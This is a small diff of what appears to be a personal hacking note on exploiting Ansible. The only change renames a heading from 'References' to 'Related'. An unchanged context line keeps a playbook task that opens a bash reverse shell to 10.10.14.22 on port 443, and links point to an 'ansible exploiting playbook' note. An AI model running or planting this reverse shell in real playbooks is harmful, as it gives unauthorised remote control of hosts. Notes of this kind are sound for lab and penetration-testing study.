@@ -6,7 +6,7 @@
     shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'
 ```
 
-# References
+# Related
 - [20221003150338](/zet/20221003150338/README.md) ansible exploiting playbook
 - ~/kb/hacking/misc/ansible.md
 
